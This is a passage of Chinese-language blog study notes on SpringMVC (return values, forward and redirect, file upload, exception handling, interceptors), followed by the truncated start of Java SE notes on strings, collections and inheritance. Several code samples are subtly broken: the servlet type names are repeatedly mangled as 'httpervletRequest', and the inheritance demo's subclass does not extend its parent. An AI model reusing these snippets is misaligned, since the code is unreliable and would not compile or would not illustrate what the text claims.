System.out.println(&quot;testGet...&quot;);        String msg = (String) model.get(&quot;msg&quot;);        System.out.println(msg);        return &quot;success&quot;;    &#125;    //完成会话，清除session域的值    @RequestMapping(&quot;/testDel&quot;)    public String testDel(SessionStatus status) &#123;        System.out.println(&quot;testDel...&quot;);        status.setComplete();        return &quot;success&quot;;    &#125;</code></pre><p>在success.jsp 中获取数据：</p><p><img src="http://img-blog.csdnimg.cn/20201024225011106.png#pic_center" alt="在这里插入图片描述"><br>三个方法依次执行，结果如下：</p><p><strong>游览器</strong>：</p><p>存入：<br><img src="http://img-blog.csdnimg.cn/20201024225257212.png#pic_center" alt="在这里插入图片描述"><br>删除：<br><img src="http://img-blog.csdnimg.cn/20201024225401139.png#pic_center" alt="在这里插入图片描述"><br><strong>控制台</strong>：</p><p><img src="http://img-blog.csdnimg.cn/20201024225431564.png#pic_center" alt="在这里插入图片描述"></p><h4 id="七、响应数据和结果视图-："><a href="#七、响应数据和结果视图-：" class="headerlink" title="七、响应数据和结果视图 ："></a>七、响应数据和结果视图 ：</h4><h5 id="1、返回值分类："><a href="#1、返回值分类：" class="headerlink" title="1、返回值分类："></a>1、返回值分类：</h5><p><strong>1.1、返回字符串类</strong>：</p><p>Controller方法返回字符串可以指定逻辑视图的名称，根据视图解析器为物理视图的地址。</p><pre><code class="java">@RequestMapping(&quot;/testReturnString&quot;)public String testReturnString() &#123;    System.out.println(&quot;AccountController 的 testReturnString 方法执行了。。。。&quot;);    return &quot;success&quot;;&#125;</code></pre><p><strong>1.2、返回void</strong>：</p><p> 如果控制器的方法返回值编写成void，执行程序报404的异常，默认查找JSP页面没有找到。</p><p>默认会跳转到当前 RequestMapping注解 value值同名的 jsp 页面。</p><p>例：</p><p><img src="http://img-blog.csdnimg.cn/20201028192658291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>Controller页面：</p><pre><code class="java">@Controller@RequestMapping(&quot;/user&quot;)public class UserController &#123;    @RequestMapping(&quot;/testString&quot;)    public void testString() &#123;        System.out.println(&quot;testString方法执行了...&quot;);    &#125;&#125;</code></pre><p>这时可以新建 /WEB-INF/pages/user/testString.jsp 文件解决问题，或者可以使用<strong>请求转发</strong>或者<strong>重定向</strong>跳转到指定的页面。</p><p>例：</p><pre><code class="java">    @RequestMapping(&quot;/testReturnVoid&quot;)    public void testReturnVoid(httpervletRequest request, httpervletResponse response)            throws Exception &#123;        // 1、使用 request 转向页面，如下：        request.getRequestDispatcher(&quot;/WEB-INF/pages/success.jsp&quot;).forward(request, response);        //2、也可以通过 response 页面重定向：        response.sendRedirect( &quot;index.jsp&quot;);         //3、也可以通过 response 指定响应结果：        response.setCharacterEncoding(&quot;utf-8&quot;);        response.setContentType(&quot;application/json;charset=utf-8&quot;);        response.getWriter().write(&quot;json 串&quot;);    &#125;</code></pre><p>注意：</p><p>如果是重定向到 jsp 页面，则 jsp 页面必须在根目录下即 webapp目录下 ，不能写在 WEB-INF 目录中，否则无法找到。</p><p><strong>1.3、返回值是ModelAndView对象</strong>：</p><p>ModelAndView 是 SpringMVC 为我们提供的一个对象，该对象也可以用作控制器方法的返回值。</p><p>示例代码：</p><pre><code class="java"> @RequestMapping(&quot;/testReturnModelAndView&quot;)    public ModelAndView testReturnModelAndView() &#123;        ModelAndView mv = new ModelAndView();        mv.addObject(&quot;username&quot;, &quot;张三&quot;);        mv.setViewName(&quot;success&quot;);// 设置要跳转到的jsp的页面，是经过视图解析器的。        return mv;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201028200111913.png#pic_center" alt="在这里插入图片描述"></p><h5 id="2-SpringMVC框架提供的转发和重定向："><a href="#2-SpringMVC框架提供的转发和重定向：" class="headerlink" title="2. SpringMVC框架提供的转发和重定向："></a>2. SpringMVC框架提供的转发和重定向：</h5><p><strong>2.1、forward 转发</strong>：</p><p>controller 方法在提供了 String 类型的返回值之后，默认就是请求转发。也可以写成：</p><pre><code class="java">@RequestMapping(&quot;/testForward&quot;)public String testForward() &#123;    System.out.println(&quot;AccountController 的 testForward 方法执行了。。。。&quot;);    return &quot;forward:/WEB-INF/pages/success.jsp&quot;;&#125;</code></pre><p>它相当于 <code>request.getRequestDispatcher(&quot;url&quot;).forward(request,response)</code> 。使用请求转发，既可以转发到 jsp，也可以转发到其他的控制器方法。</p><p><strong>2.2、Redirect 重定向</strong>：</p><p>contrller 方法提供了一个 String 类型返回值之后，它需要在返回值里使用：redirect </p><pre><code class="java">@RequestMapping(&quot;/testRedirect&quot;)public String testRedirect() &#123;    System.out.println(&quot;AccountController 的 testRedirect 方法执行了。。。。&quot;);    return &quot;redirect:testReturnModelAndView&quot;;&#125;</code></pre><p>它相当于 <code>response.sendRedirect(url)</code>，同样的：如果是重定向到 jsp 页面，则 jsp 页面必须在根目录下即 webapp目录下 ，不能写在 WEB-INF 目录中，否则无法找到。</p><h4 id="八、SpringMVC-实现文件上传-："><a href="#八、SpringMVC-实现文件上传-：" class="headerlink" title="八、SpringMVC 实现文件上传 ："></a>八、SpringMVC 实现文件上传 ：</h4><h5 id="1-文件上传的回顾"><a href="#1-文件上传的回顾" class="headerlink" title="1. 文件上传的回顾:"></a>1. 文件上传的回顾:</h5><p><strong>1.1、文件上传的必要前提</strong>：</p><ul><li>form 表单的 enctype 取值必须是：multipart/form-data(默认值是:application/x-www-form-urlencoded) </li><li>enctype 是表单请求正文的类型</li><li>method 属性取值必须是 Post</li></ul><p><strong>1.2、文件上传的原理分析</strong>：</p><p>当 form 表单的 enctype 取值不是默认值后，<code>request.getParameter()</code> 将失效。</p><p>当 enctype = “application/x-www-form-urlencoded” 时，form 表单的正文内容是：<code>key=value&amp;key=value&amp;key=value</code></p><p>当 form 表单的 enctype 取值为 Mutilpart/form-data 时，请求正文内容就变成：</p><p>每一部分都是 MIME 类型描述的正文</p><pre><code class="java">-----------------------------7de1a433602ac  分界符Content-Disposition: form-data; name=&quot;userName&quot; 协议头aaa   协议的正文（文件内容）-----------------------------7de1a433602ac Content-Disposition: form-data; name=“file”;filename=“C:\Users\zhy\Desktop\fileupload_demofile\b.txt”Content-Type: text/plain    协议的类型（MIME 类型）bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb-----------------------------7de1a433602ac--</code></pre><p><strong>1.3、实现步骤</strong>:</p><ol><li>导入文件上传需要的jar包：</li></ol><pre><code class="html">&lt;dependency&gt;    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;    &lt;version&gt;1.3.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;commons-io&lt;/groupId&gt;    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;    &lt;version&gt;2.4&lt;/version&gt;&lt;/dependency&gt;</code></pre><ol start="2"><li>编写文件上传的JSP页面：</li></ol><pre><code class="html">&lt;form action=&quot;user/fileupload1&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    选择文件：&lt;input type=&quot;file&quot; name=&quot;upload&quot;/&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;/&gt;&lt;/form&gt;</code></pre><ol start="3"><li>编写文件上传的Controller控制器：</li></ol><pre><code class="java">@RequestMapping(value = &quot;/fileupload1&quot;)    public String fileupload(httpervletRequest request) throws Exception &#123;        // 先获取到要上传的文件目录        String path = request.getSession().getServletContext().getRealPath(&quot;/uploads&quot;);        System.out.println(path);        // 创建File对象，一会向该路径下上传文件        File file = new File(path);        // 判断路径是否存在，如果不存在，创建该路径        if (!file.exists()) &#123;            file.mkdirs();        &#125;        // 创建磁盘文件项工厂        DiskFileItemFactory factory = new DiskFileItemFactory();        ServletFileUpload fileUpload = new ServletFileUpload(factory);        // 解析request对象        List&lt;FileItem&gt; list = fileUpload.parseRequest(request);        // 遍历        for (FileItem fileItem : list) &#123;            // 判断文件项是普通字段，还是上传的文件            if (fileItem.isFormField()) &#123;            &#125; else &#123;                // 上传文件项                // 获取到上传文件的名称                String filename = fileItem.getName();                //生成唯一id，防止文件覆盖                String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;);//把uuid里的&quot;-&quot;替换成&quot;&quot;                filename = uuid + filename;                // 上传文件                fileItem.write(new File(file, filename));                // 删除临时文件                fileItem.delete();            &#125;        &#125;        return &quot;success&quot;;    &#125;</code></pre><h5 id="2、SpringMVC传统方式文件上传："><a href="#2、SpringMVC传统方式文件上传：" class="headerlink" title="2、SpringMVC传统方式文件上传："></a>2、SpringMVC传统方式文件上传：</h5><p>SpringMVC框架提供了MultipartFile对象，该对象表示上传的文件，要求<font color="red" >变量名称必须和表单file标签的name属性名称相同</font>。</p><p>即：</p><p><img src="http://img-blog.csdnimg.cn/20201029183136193.png#pic_center" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201029183307667.png#pic_center" alt="在这里插入图片描述"></p><ol><li>jsp页面：</li></ol><pre><code class="java">&lt;h3&gt;SpringMVC文件上传&lt;/h3&gt;&lt;form action=&quot;fileupload2&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    选择文件：&lt;input type=&quot;file&quot; name=&quot;upload&quot;/&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;/&gt;&lt;/form&gt;</code></pre><ol start="2"><li>控制器代码：</li></ol><pre><code class="java">@RequestMapping(value = &quot;/fileupload2&quot;)    public String fileupload2(httpervletRequest request, MultipartFile upload) throws Exception &#123;        System.out.println(&quot;SpringMVC方式的文件上传...&quot;);        // 先获取到要上传的文件目录        String path = request.getSession().getServletContext().getRealPath(&quot;/uploads&quot;);        // 创建File对象，一会向该路径下上传文件        File file = new File(path);        // 判断路径是否存在，如果不存在，创建该路径        if (!file.exists()) &#123;            file.mkdirs();        &#125;        // 获取到上传文件的名称        String filename = upload.getOriginalFilename();        String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;&quot;);        // 把文件的名称唯一化        filename = uuid + &quot;_&quot; + filename;        // 上传文件        upload.transferTo(new File(file, filename));        return &quot;success&quot;;    &#125;</code></pre><p> 3、配置文件解析器对象：</p><pre><code class="java">    &lt;!-- 配置文件解析器对象，要求id名称必须是multipartResolver --&gt;    &lt;bean id=&quot;multipartResolver&quot;          class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;        &lt;property name=&quot;maxUploadSize&quot; value=&quot;10485760&quot;/&gt;    &lt;/bean&gt;</code></pre><p><strong>注意</strong>：</p><p> 一但采用 MultipartResolver 进行文件上传，MultipartResolver 根据请求头部的的 content-type 判断是否含有 ”multipart/form-data”。如果有，则把请求封装成 MultipartFile。</p><p>这时传统的上传方式就不能用了。</p><h5 id="3、SpringMVC跨服务器方式文件上传："><a href="#3、SpringMVC跨服务器方式文件上传：" class="headerlink" title="3、SpringMVC跨服务器方式文件上传："></a>3、SpringMVC跨服务器方式文件上传：</h5><p><strong>1、分服务器的目的</strong>：</p><p>在实际开发中，会有很多处理不同功能的服务器。例如：</p><ul><li>应用服务器：负责部署我们的应用</li><li>数据库服务器：运行我们的数据库</li><li>缓存和消息服务器：负责处理大并发访问的缓存和消息</li><li>文件服务器：负责存储用户上传文件的服务器。</li></ul><p>分服务器处理的目的是让服务器各司其职，从而提高项目的运行效率。</p><p><img src="http://img-blog.csdnimg.cn/20201029205338323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>实现步骤：</p><p>1、创建两个web项目，其中一个作为上传服务器使用，并都在tomcat 进行发布。</p><p>2、实现SpringMVC跨服务器方式文件上传：</p><ol><li>导入开发需要的jar包：<pre><code class="xml">&lt;dependency&gt; &lt;groupId&gt;com.sun.jersey&lt;/groupId&gt; &lt;artifactId&gt;jersey-core&lt;/artifactId&gt; &lt;version&gt;1.18.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.sun.jersey&lt;/groupId&gt; &lt;artifactId&gt;jersey-client&lt;/artifactId&gt; &lt;version&gt;1.18.1&lt;/version&gt;&lt;/dependency&gt;</code></pre></li><li>编写文件上传的JSP页面：</li></ol><pre><code class="java">&lt;h3&gt;跨服务器文件上传&lt;/h3&gt;&lt;form action=&quot;fileupload3&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    选择文件：&lt;input type=&quot;file&quot; name=&quot;upload&quot;/&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;/&gt;&lt;/form&gt;</code></pre><ol start="3"><li>编写控制器：</li></ol><pre><code class="java">  @RequestMapping(value = &quot;/fileupload3&quot;)    public String fileupload3(MultipartFile upload) throws Exception &#123;        System.out.println(&quot;SpringMVC跨服务器方式的文件上传...&quot;);        // 定义图片服务器的请求路径        String path = &quot;http://localhost:9090/fileupload/uploads /&quot;;        // 获取到上传文件的名称        String filename = upload.getOriginalFilename();        String uuid = UUID.randomUUID().toString().replaceAll(&quot;-&quot;, &quot;&quot;).toUpperCase();        // 把文件的名称唯一化        filename = uuid + &quot;_&quot; + filename;        // 向图片服务器上传文件        // 创建客户端对象        Client client = Client.create();        // 连接图片服务器        WebResource webResource = client.resource(path + filename);        // 上传文件        webResource.put(upload.getBytes());        return &quot;success&quot;;    &#125;</code></pre><p>需要注意的是：图片服务器里的 uploads 文件需要自己创建，在Tomcat 服务器的 webapps的根目录下创建。</p><p><img src="http://img-blog.csdnimg.cn/20201029210616834.png#pic_center" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201029210650604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>上传成功。</p><h4 id="9、SpringMVC-中的异常处理："><a href="#9、SpringMVC-中的异常处理：" class="headerlink" title="9、SpringMVC 中的异常处理："></a>9、SpringMVC 中的异常处理：</h4><p>若遇到错误或者异常，返回给用户一个良好的错误信息比直接返回报错的游览器页面要好的多。</p><p>当系统的 dao、service、controller 出现异常时都是向上抛出的，最后由 springmvc 前端控制器交由异常处理器进行异常处理，如下图：</p><p><img src="http://img-blog.csdnimg.cn/20201030103136899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>1、SpringMVC的异常处理</strong>：</p><ul><li>模拟异常信息：</li></ul><pre><code class="java">@Controller@RequestMapping(&quot;/user&quot;)public class UserController &#123;    @RequestMapping(&quot;/testException&quot;)    public String testException() throws SysException &#123;        System.out.println(&quot;testException执行了...&quot;);        try &#123;            //模拟异常            int a = 10 / 0;        &#125; catch (Exception e) &#123;            //控制台打印异常信息            e.printStackTrace();            //抛出自定义异常类信息            throw new SysException(&quot;查询所有用户出现了错误！&quot;);        &#125;        return &quot;success&quot;;    &#125;&#125;</code></pre><ol><li>自定义异常类：</li></ol><pre><code class="java">public class SysException extends Exception &#123;    private String message;    public String getMessage() &#123;        return message;    &#125;    public SysException(String message) &#123;        this.message = message;    &#125;&#125;</code></pre><ol start="2"><li>自定义异常处理器：</li></ol><pre><code class="java">public class SysExceptionResolver implements HandlerExceptionResolver &#123;    @Override    public ModelAndView resolveException(httpervletRequest httpervletRequest, httpervletResponse httpervletResponse, Object o, Exception ex) &#123;        SysException e = null;        // 获取到异常对象        //如果抛出的是系统自定义异常则直接转换        if (ex instanceof SysException) &#123;            e = (SysException) ex;        &#125; else &#123;            e = new SysException(&quot;请联系管理员&quot;);        &#125;        ModelAndView mv = new ModelAndView();        // 存入错误的提示信息        mv.addObject(&quot;message&quot;, e.getMessage());        // 跳转的Jsp页面        mv.setViewName(&quot;error&quot;);        return mv;    &#125;&#125;</code></pre><ol start="3"><li>配置异常处理器</li></ol><pre><code class="html">&lt;!-- 配置异常处理器 --&gt;&lt;bean id=&quot;sysExceptionResolver&quot; class=&quot;cn.itcast.exception.SysExceptionResolver&quot;/&gt;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201030112359217.png#pic_center" alt="在这里插入图片描述"></p><h4 id="10、SpringMVC框架中的拦截器"><a href="#10、SpringMVC框架中的拦截器" class="headerlink" title="10、SpringMVC框架中的拦截器"></a>10、SpringMVC框架中的拦截器</h4><p><strong>1、拦截器的作用</strong>：</p><p>1、Spring MVC 的处理器拦截器类似于 Servlet 开发中的过滤器 Filter，用于对处理器进行预处理和后处理。用户可以自己定义一些拦截器来实现特定的功能。</p><p>2、 可以定义拦截器链，连接器链就是将拦截器按着一定的顺序结成一条链，在访问被拦截的方法时，拦截器链中的拦截器会按着定义的顺序执行。</p><p>3、拦截器和过滤器的功能比较类似，区别是：</p><ul><li>过滤器是 servlet 规范中的一部分，任何 java web 工程都可以使用。</li><li>拦截器是 SpringMVC 框架自己的，只有使用了 SpringMVC 框架的工程才能用。</li><li>过滤器在 url-pattern 中配置了/*之后，可以对所有要访问的资源拦截。</li><li>拦截器它是只会拦截访问的控制器方法，如果访问的是 jsp，html,css,image 或者 js 是不会进行拦截的。</li></ul><p>想要自定义拦截器， 要求必须实现：HandlerInterceptor 接口。</p><p><strong>2、自定义拦截器的步骤</strong>：</p><p>2.1、 创建类，实现HandlerInterceptor接口：</p><pre><code class="java">public class MyInterceptor1 implements HandlerInterceptor &#123;    /**     * controller方法执行前，进行拦截的方法     * return true放行     * return false拦截     * 可以使用转发或者重定向直接跳转到指定的页面。     */    @Override    public boolean preHandle(httpervletRequest request, httpervletResponse response, Object handler) throws Exception &#123;        System.out.println(&quot;preHandle 方法执行了...&quot;);        return true;    &#125;    /**     * controller方法执行后，进行拦截的方法     * 可以使用转发或者重定向直接跳转到指定的页面。     */    @Override    public void postHandle(httpervletRequest request, httpervletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;        System.out.println(&quot;postHandle 方法执行了&quot;);    &#125;    /**     * JSP执行后执行     * 不可以使用转发或者重定向直接跳转到指定的页面。     */    @Override    public void afterCompletion(httpervletRequest request, httpervletResponse response, Object handler, Exception ex) throws Exception &#123;        System.out.println(&quot;afterCompletion 方法执行了&quot;);    &#125;&#125;</code></pre><p>2.2、 在springmvc.xml中配置拦截器类：</p><pre><code class="java">  &lt;!-- 配置拦截器 --&gt;    &lt;mvc:interceptors&gt;        &lt;mvc:interceptor&gt;            &lt;!-- 哪些方法进行拦截 --&gt;            &lt;mvc:mapping path=&quot;/*&quot;/&gt;            &lt;!-- 注册拦截器对象 --&gt;            &lt;bean class=&quot;com.smk.interceptor.MyInterceptor1&quot;/&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;</code></pre><p>2.3、controller 类代码：</p><pre><code class="java">@Controllerpublic class UserController &#123;    @RequestMapping(&quot;/testInterceptor&quot;)    public String testInterceptor() &#123;        System.out.println(&quot;testInterceptor执行了...&quot;);        return &quot;success&quot;;    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201103194632833.png#pic_center" alt="在这里插入图片描述"><br><strong>3、HandlerInterceptor接口中的方法</strong>：</p><p>1、preHandle方法是controller方法执行前拦截的方法</p><ol><li>可以使用request或者response跳转到指定的页面 </li><li>return true放行，执行下一个拦截器，如果没有拦截器，执行controller中的方法。</li><li>return false不放行，不会执行controller中的方法。</li></ol><p>2、 postHandle是controller方法执行后执行的方法，在JSP视图执行前。</p><ol><li>可以使用request或者response跳转到指定的页面</li><li>如果指定了跳转的页面，那么controller方法跳转的页面将不会显示。</li><li>如果controller 被拦截了则不会执行。</li></ol><p>3、afterCompletion方法是在DispatcherServlet进行视图的渲染之后执行</p><ol><li>request或者response不能再跳转页面了</li><li>如果controller方法被拦截了，也会执行！</li></ol><p><strong>4、 配置多个拦截器</strong>：</p><p> 配置第2个拦截器</p><pre><code class="java">    &lt;!-- 配置拦截器 --&gt;    &lt;mvc:interceptors&gt;        &lt;mvc:interceptor&gt;            &lt;!-- 哪些方法进行拦截 --&gt;            &lt;mvc:mapping path=&quot;/user/*&quot;/&gt;            &lt;!-- 注册拦截器对象 --&gt;            &lt;bean class=&quot;com.smk.interceptor.MyInterceptor1&quot;/&gt;        &lt;/mvc:interceptor&gt;        &lt;mvc:interceptor&gt;            &lt;!-- 哪些方法进行拦截 --&gt;            &lt;mvc:mapping path=&quot;/**&quot;/&gt;            &lt;!-- 注册拦截器对象 --&gt;            &lt;bean class=&quot;com.smk.interceptor.MyInterceptor2&quot;/&gt;        &lt;/mvc:interceptor&gt;    &lt;/mvc:interceptors&gt;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201103201210882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaEE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringMVC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java SE重点知识笔记</title>
      <link href="2020/09/28/Java%20SE%20%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/"/>
      <url>2020/09/28/Java%20SE%20%E9%87%8D%E7%82%B9%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>          &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学了半年的Java web 发现还有一些JavaSE的知识没有掌握，趁着这个暑假把java的基础知识补一下。<hr></p><p>[toc]</p><h4 id="1、String对象的特点"><a href="#1、String对象的特点" class="headerlink" title="1、String对象的特点"></a>1、String对象的特点</h4><p><strong>1、创建字符串对象两种方式的区别</strong>：</p><ul><li>通过构造方法创建</li></ul><p>通过 new 创建的字符串对象，每一次 new 都会申请一个内存空间，虽然内容相同，但是地址值不同。<br><img src="https://img-blog.csdnimg.cn/20200725232701179.png"><br>上面的代码中，JVM会首先创建一个字符数组, 然后每一次new的时候都会有一 个新的地址， 只不过s1和s2参考的字符串内容是相同的。</p><ul><li>直接赋值方式创建</li></ul><p>以<code>&quot;&quot;</code>方式给出的字符串，只要字符序列相同(顺序和大小写)，无论在程序代码中出现几次，JVM 都只会建立一个 String 对象，并在字符串池中维护。<br><img src="https://img-blog.csdnimg.cn/20200725234256229.png"><br>在上面的代码中，针对第一行代码， JVM会建立一个 String对象放在字符串池中，并给s3参考，第二行则让s4直接参考字符串池中的String对象,也就是说它们本质上是同一个对象。</p><p><strong>2、字符串的比较</strong>：</p><p>1、<code>==</code>号的作用 ：</p><ul><li>比较基本数据类型:比较的是具体的值</li><li>比较引用数据类型:比较的是对象地址值</li></ul><p>2、<code>equals</code>方法的作用：</p><p>因为String是类，属于引用类型，所以用<code>equals</code>来进行比较。</p><pre><code class="java">public boolean equals(String s)   比较两个字符串内容是否相同、区分大小写</code></pre><p><img src="https://img-blog.csdnimg.cn/20200819215804840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><hr></p><h4 id="2、StringBuilder对象"><a href="#2、StringBuilder对象" class="headerlink" title="2、StringBuilder对象"></a>2、StringBuilder对象</h4><p><strong>1、StringBuilder概述</strong>：</p><ul><li>StringBuilder是一个可变的字符串类,我们可以把它看成是一个容器，这里的可变指的是StringBuilder对象中的内容是可变的。</li></ul><p>String和StringBuilder的区别:</p><ul><li>String: 内容是不可变的</li><li>StringBuilder: 内容是可变的</li></ul><p><strong>2、StringBuilder类的构造方法</strong>：</p><p>常用的构造方法：<br><img src="https://img-blog.csdnimg.cn/20200730221223824.png"></p><p>示例代码：</p><pre><code class="java">public class StringTest2 &#123;    public static void main(String[] args) &#123;        // public StringBuilder() :创建一个空白可变字符串对象,不含有任何内容        StringBuilder sb = new StringBuilder();        System.out.println(&quot;sb:&quot; + sb);        System.out.println(&quot;sb. length():&quot; + sb.length());        // public Stri ngBuilder(String str) :根据字符串的内容，来创建可变字符串对象        StringBuilder sb2 = new StringBuilder(&quot;he11o&quot;);        System.out.println(&quot;sb2:&quot; + sb2);        System.out.println(&quot;sb2. length():&quot; + sb2.length());    &#125;&#125;</code></pre><p><strong>3、StringBuilder类添加和反转方法</strong>：</p><p> 添加和反转方法：<br><img src="https://img-blog.csdnimg.cn/20200730223038613.png"><br> 示例代码：<br><img src="https://img-blog.csdnimg.cn/20200730223855933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>4、StringBuilder和String相互转换</strong>：</p><p>StringBuilder转换为String：</p><ul><li><p><code>public String toString()</code>：通过<code>toString()</code>就可以实现把StringBuilder转换为String</p><p>String转换为StringBuilder：</p></li><li><p><code>public StringBuilder(String s)</code> ：通过构造方法就可以实现把String转换为StringBuilder</p><hr></li></ul><h4 id="3、ArrayList"><a href="#3、ArrayList" class="headerlink" title="3、ArrayList"></a>3、ArrayList</h4><p><strong>1、ArrayList类概述</strong>：</p><p> 什么是集合：</p><ul><li><p>提供一种存储空间可变的存储模型，存储的数据容量可以发生改变。</p><p>ArrayList集合的特点：</p></li><li><p>底层是数组实现的，长度可以变化。    </p></li></ul><p>泛型的使用：</p><ul><li>用于约束集合中存储元素的数据类型。</li></ul><p><strong>2、ArrayList类常用方法</strong>：</p><p>构造方法：<br>| 方法名 | 说明 |<br>|–|–|<br>| public ArrayList() | 创建一个空的集合对象 |<br>成员方法：<br><img src="https://img-blog.csdnimg.cn/20200731204753744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><pre><code class="java">public class ArrayListDemo02 &#123;    public static void main(String[] args) &#123;        // 创建集合        ArrayList&lt;String&gt; array = new ArrayList&lt;String&gt;();        // 添加元素        array.add(&quot;hello&quot;);        array.add(&quot;world&quot;);        array.add(&quot;java&quot;);        // public boolean remove(Object o)：删除指定的元素，返回删除是否成功        System.out.println(array.remove(&quot;world&quot;));        System.out.println(array.remove(&quot;javaee&quot;));        // public E remove(int index)：删除指定索引处的元素，返回被删除的元素        System.out.println(array.remove(1));        // IndexOutOfBoundsException        System.out.println(array.remove(3));        // public E set(int index,E element)：修改指定索引处的元素，返回被修改的元素        System.out.println(array.set(1, &quot;javaee&quot;));        // IndexOutOfBoundsException        System.out.println(array.set(3, &quot;javaee&quot;));        // public E get(int index)：返回指定索引处的元素        System.out.println(array.get(0));        System.out.println(array.get(1));        System.out.println(array.get(2));        // public int size()：返回集合中的元素的个数        System.out.println(array.size());        // 输出集合        System.out.println(&quot;array:&quot; + array);    &#125;&#125;</code></pre><hr><h4 id="4、继承"><a href="#4、继承" class="headerlink" title="4、继承"></a>4、继承</h4><p><strong>1、 继承的好处和弊端</strong>：</p><p>继承好处：</p><ul><li>提高了代码的复用性(多个类相同的成员可以放到同一个类中)</li><li>提高了代码的维护性(如果方法的代码需要修改，修改一处即可)</li></ul><p>继承弊端：</p><ul><li>继承让类与类之间产生了关系，类的耦合性增强了，当父类发生变化时子类实现也不得不跟着变化，削弱了子类的独立性。</li></ul><p>继承的应用场景：</p><ul><li>使用继承，需要考虑类与类之间是否存在is..a的关系，不能盲目使用继承。</li><li>is..a的关系：谁是谁的一种，例如：老师和学生是人的一种，那人就是父类，学生和老师就是子类。</li></ul><p><strong>2. 继承中的成员访问特点</strong>：</p><p><strong>2.1 继承中变量的访问特点</strong>：</p><p>在子类方法中访问一个变量，采用的是就近原则。</p><ol><li>子类局部范围找</li><li>子类成员范围找</li><li>父类成员范围找</li><li>如果都没有就报错(不考虑父亲的父亲…)</li></ol><p>示例代码：</p><pre><code class="java">class Fu &#123;    int num = 10;&#125;class Zi &#123;    int num = 20;    public void show()&#123;    int num = 30;    System.out.println(num);    &#125;&#125;public class Demo1 &#123;    public static void main(String[] args) &#123;    Zi z = new Zi();    z.show(); // 输出show方法中的局部变量30    &#125;&#125;</code></pre><p><strong>2.2、super</strong>:</p><p>this&amp;super关键字：</p><ul><li>this：代表本类对象的引用</li><li>super：代表父类存储空间的标识(可以理解为父类对象引用)</li></ul><p>this和super的使用分别：<br><img src="https://img-blog.csdnimg.cn/20200803210418891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>2.3 继承中构造方法的访问特点</strong>：</p><p> <font color 